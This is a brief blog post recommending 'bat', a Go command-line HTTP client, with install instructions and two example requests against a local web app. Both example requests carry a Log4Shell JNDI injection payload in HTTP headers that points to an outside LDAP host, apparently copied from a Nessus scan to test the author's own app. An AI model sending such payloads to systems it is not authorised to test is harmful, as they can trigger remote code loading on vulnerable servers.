---
layout: post
title:  BAT, Golang Http Client
date:   2023-01-06 09:10:03 -0800
categories: http golang
---

A few days ago I need to to craft some non standard http requests and
send them to our web application. I've used `httpie` in the past, but wanted 
to try something different. Given that golang clients would have all the 
deps bundled I figured I'd check if there were any good projects on github. 
I found [bat](https://github.com/astaxie/bat) that was really easy to install 
and worked great. Turns out it was actually inspired by `httpie`

`go install github.com/astaxie/bat@latest`

Then was off to the races:

```
bat localhost:3000 User-Agent:"\${jndi:ldap://log4shell-generic-HJRowHlwCKDBn2GuIMz7\${lower:ten}.w.nessus.org/nessus}" Content-Type:application/html
bat localhost:3000 Content-Type:"\${jndi:ldap://log4shell-generic-HJRowHlwCKDBn2GuIMz7\${lower:ten}.w.nessus.org/nessus}"
```

Will definitely be using this again in the future.
